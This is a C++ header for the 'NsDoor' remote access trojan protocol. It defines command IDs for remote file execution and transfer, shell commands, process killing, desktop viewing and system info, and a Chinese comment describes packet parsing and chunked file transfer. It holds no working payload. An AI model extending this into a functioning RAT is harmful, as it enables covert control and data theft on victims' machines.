//////////////////////////////////////////////////////////////////////////
//File： RatProto.cpp
//REM:	 NsDoor Ptotocol
//////////////////////////////////////////////////////////////////////////
#pragma once
//命令个数
#define IDNUM 100
//NAME字节数
#define NAMESIZE 80


enum RATID{
FILE_VIEW,FILE_OPEN,FILE_DELETE,FILE_EXCUTE,FILE_DOWNLOAD,FILE_UPLOAD,FILE_BACK,FILE_REPLY,FILE_DOWNREPLY,FILE_TRANSMIT,
CMD_REQUSET,CMD_REPLY,
PROC_VIEW,PROC_DELETE,
KEY_OK,KEY_CANCEL,KEY_REPLY,
DESK_VIEW,
SYS_VIEW
};



//NsDoor 协议
struct RatProto{
	RATID RatId;		//命令ID
	int	  RatCsm;		//密钥
	int	  RatLen;		//数据部分长度
};

//定义系统信息结构体
struct SysInfo{
	char Name[20];
	char Value[80];
};
//进程信息结构体
struct ProcInfo{
	int pid;
	char Name[30];
};
//文件信息结构体
struct FileInfo{
	int Type;
	char Name[NAMESIZE];
};

/*
先接收协议头，即RatProto，解析命令ID，假设命令ID是不需要参数的，例如SYSINFO_VIEW,则直接根据RatFunc散列索引到
RatFunc[foo_ID],代表对应的命令处理函数地址。
如果是需要参数的，根据RatCsm获得协议的加密类型，如base64，或者是校验和，例如CRC校验等，数据内容的长度由
RatLen-sizeof(RatProto)决定，根据这些信息解密数据内容或者进行简单校验，假设RatLen<sizeof(RatProto),也代表
此协议包已出错，需抛弃。
数据内容重新CopyMemory到一缓冲区，并把缓冲区地址作为RatFunc[foo_ID]的args参数。
各功能对应参数属于C/S商议好的，可以在内部再定义结构体进行解析参数。


大部分命令的参数字节数都很少，假设不会出现错误。
处理FILE_DOWNLOAD,FILE_UPLOAD消息时，先 请求文件的长度，然后分片，假设每片是固定长度，即RatLen应该为一定值，
当遇到RatLen不再等于那个定值时，在传输正确的情况下应该是已经收到了整个文件内容，然后把接收的所有字节数和文
件长度比较，如果一致代表传输成功，否则代表文件此数据包是异常数据包
*/